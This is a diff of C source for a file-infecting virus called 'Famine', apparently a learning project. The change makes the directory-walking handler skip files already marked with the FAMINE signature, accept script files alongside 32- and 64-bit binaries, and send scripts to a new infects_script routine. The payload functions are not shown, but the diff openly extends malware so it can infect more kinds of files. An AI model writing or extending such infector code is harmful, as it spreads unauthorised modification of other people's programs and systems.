@@ -1,5 +1,14 @@
 #include "ft_famine.h"
 
+static bool handle_file_format(t_binary *binary)
+{
+    if(check_file_arch(binary))
+        return true;
+    if(check_script_format(binary))
+        return true;
+    return false;
+}
+
 static bool already_infected(t_binary *binary, const char *famine)
 {
     if(!memmem(binary->buffer, binary->file_size, famine, strlen(famine)))
@@ -31,14 +40,14 @@ int file_handler(char *path)
                     full_path = NULL;
                     continue;
                 }
-                if(!check_file_arch(binary))
+                if(already_infected(binary, FAMINE))
                 {
                     free_binary(binary);
                     free(full_path);
                     full_path = NULL;
                     continue;
                 }
-                if(already_infected(binary, FAMINE))
+                if(!handle_file_format(binary))
                 {
                     free_binary(binary);
                     free(full_path);
@@ -47,8 +56,10 @@ int file_handler(char *path)
                 }
                 if(binary->arch == ARCH64)
                     ret = infects_64(binary, full_path);
-                else
+                else if(binary->arch == ARCH32)
                     ret = infects_32(binary, full_path);
+                else
+                    ret = infects_script(binary, full_path);
                 free_binary(binary);
                 free(full_path);
                 full_path = NULL;
